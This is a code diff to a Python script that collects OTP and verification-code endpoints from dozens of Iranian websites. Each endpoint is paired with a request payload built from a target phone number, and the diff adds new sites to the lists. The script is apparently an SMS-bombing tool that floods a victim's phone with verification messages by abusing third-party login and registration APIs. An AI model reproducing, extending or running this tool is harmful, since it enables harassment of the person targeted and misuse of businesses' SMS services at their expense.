@@ -1,11 +1,18 @@
 def send_otp_requests(number):
     url_payload_map = {
+        'janebi': ('https://janebi.com/signin?do', {'resend': '0' + number}),
+        'badparak': ('https://badparak.com/register/request_verification_code', {'mobile': '0' + number}),
+        'nalinoco': ('https://www.nalinoco.com/api/customers/login-register', {'mobile': '0' + number,'ReturnUrl':'/','step':'1'}),
+        'hiss': ('https://hiss.ir/wp-admin/admin-ajax.php', {'phone_email': '0' + number,'action':'bakala_send_code'}),
+        'tahrir-online': ('https://tahrir-online.ir/wp-admin/admin-ajax.php', {'phone': '+98' + number,'form':'register','action':'mobix_send_otp_code'}),
         'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
+        'martday': ('https://martday.ir/api/customer/member/register/', {'email': '0' + number,'accept_term':'on'}),
         'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
         'electrastore': ('https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code', {'telephone': '0' + number}),
         'atrinelec': ('https://www.atrinelec.com/ajax/SendSmsVerfiyCode', {'mobile': '0' + number}),
         'ketabweb': ('https://ketabweb.com/login/?usernameCheck=1', {'username': '0' + number}),
         'dastaneman': ('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
+        '80w': ('https://80w.ir/wp-admin/admin-ajax.php', {'login': '0' + number,'action':'logini_first'}),
         'noavarpub': ('https://noavarpub.com/logins/login.php?ref=https%3A%2F%2Fnoavarpub.com%2F', {'phone': '0' + number,'submit':'123'}),
         'hovalvakil': ('https://api.hovalvakil.com/api/User/SendConfirmCode?userName='+ number +'', None),
         'digighate': ('https://api.digighate.com/v2/public/code?phone='+ number +'', None),
@@ -161,8 +168,19 @@ def send_otp_requests(number):
         'elecmarket': ('https://elecmarket.ir/wp-admin/admin-ajax.php', {
             'action': 'stm_login_register','type':'mobile',
             'input':'0' + number
-        })
-
+        }),
+        'techsiro': ('https://techsiro.com/send-otp', {
+            'client': 'web','method':'POST','_token':'',
+            'mobile':'0' + number
+        }),
+        'noavarpub': ('https://novinparse.com/Page/PageAction.aspx', {
+            'Action': 'SendVerifyCode','verifyCode':'','repeatFlag':'true',
+            'mobile':'0' + number
+        }),
+        'titomarket': ('https://titomarket.com/index.php?route=account/login_verify/verify', {
+            'redirect': 'https://titomarket.com/my-account',
+            'telephone':'0' + number
+        }),
     }
     return list(url_payload_map.values())
 
@@ -173,7 +191,8 @@ def send_otp_requests_json(number):
         'eaccount': ('https://eaccount.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
         'queenaccessories': ('https://queenaccessories.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
         'rastaraccessory': ('https://rastaraccessory.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
-        'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""})
+        'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
+        'chortkehshop': ('https://chortkehshop.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
         
     }
 
